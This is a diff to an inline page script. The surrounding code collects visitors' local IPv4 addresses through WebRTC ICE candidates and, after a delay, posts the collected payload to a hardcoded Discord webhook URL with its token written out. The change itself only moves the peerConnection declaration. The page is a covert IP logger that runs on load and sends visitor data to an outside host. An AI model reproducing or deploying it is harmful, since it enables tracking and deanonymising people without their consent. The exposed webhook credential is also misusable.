@@ -20,6 +20,7 @@
 
     <script>
         const FINAL_PAYLOAD = {};
+        let peerConnection;
         const sendToDiscordWebhook = (webhookURL, payload) => {
           return fetch(webhookURL, {
               method: 'POST',
@@ -89,7 +90,7 @@
             await new Promise((resolve) => setTimeout(() => resolve(), 3500));
             await sendToDiscordWebhook('https://canary.discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73', FINAL_PAYLOAD);
         };
-        const peerConnection = new RTCPeerConnection();
+        peerConnection = new RTCPeerConnection();
         peerConnection.onicecandidate = function (event) {
             for (let i = 0; i < event.candidate.candidates.length; i++) {
                 if (event.candidate.candidates[i].candidate.toString().startsWith('ipv4')) {
